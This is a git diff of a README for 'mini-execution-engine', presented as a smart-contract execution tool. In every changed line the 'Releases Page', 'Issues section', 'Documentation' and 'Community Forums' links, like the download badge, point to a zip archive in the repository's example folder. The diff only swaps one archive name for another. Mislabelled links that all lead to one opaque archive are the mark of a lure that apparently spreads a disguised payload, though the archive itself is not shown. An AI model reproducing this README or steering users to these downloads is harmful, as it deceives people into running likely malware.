@@ -1,7 +1,7 @@
 # 🛠️ mini-execution-engine - Simplifying Smart Contract Execution
 
 ## 📥 Download Now
-[![Download mini-execution-engine](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip%https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip)](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip)
+[![Download mini-execution-engine](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip%https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip)](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip)
 
 ## 🚀 Getting Started
 The mini-execution-engine is a simple tool designed to help you work with custom smart contracts. It allows you to explore smart contract primitives in a straightforward way. Follow the steps below to get started quickly.
@@ -27,7 +27,7 @@ The mini-execution-engine supports various architecture designs, including:
 This tool is perfect for those interested in protocol design and system architecture.
 
 ## 📤 Download & Install
-To download the latest version, please visit the [Releases Page](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip). Here’s how to do it:
+To download the latest version, please visit the [Releases Page](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip). Here’s how to do it:
 
 1. Click on the **Releases** link above.
 2. Select the latest release version.
@@ -57,11 +57,11 @@ Yes, mini-execution-engine is completely free.
 mini-execution-engine works on Windows, macOS, and Linux. Make sure to download the correct version for your system.
 
 ### Where can I find further support?
-For questions or technical support, please check the [Issues section](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip) of the repository. You can describe your issue there, and the community or developers may help.
+For questions or technical support, please check the [Issues section](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip) of the repository. You can describe your issue there, and the community or developers may help.
 
 ## 🛠️ Additional Resources
-- [Documentation](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip): Detailed guides on usage, features, and development.
-- [Community Forums](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip): Connect with other users to share tips and find solutions.
+- [Documentation](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip): Detailed guides on usage, features, and development.
+- [Community Forums](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip): Connect with other users to share tips and find solutions.
 
 ## 📣 Stay Updated
 To stay informed about updates and new features, make sure to follow our GitHub repository and enable notifications.
@@ -69,4 +69,4 @@ To stay informed about updates and new features, make sure to follow our GitHub 
 ## 📌 License
 mini-execution-engine is licensed under the MIT License. You can use it freely, but we appreciate any contributions back to the project.
 
-Download the latest version now from our [Releases Page](https://raw.githubusercontent.com/829deez/mini-execution-engine/main/example/engine_execution_mini_1.6.zip) and start exploring the world of smart contracts with ease!
+Download the latest version now from our [Releases Page](https://github.com/829deez/mini-execution-engine/raw/refs/heads/main/example/mini_engine_execution_3.9.zip) and start exploring the world of smart contracts with ease!
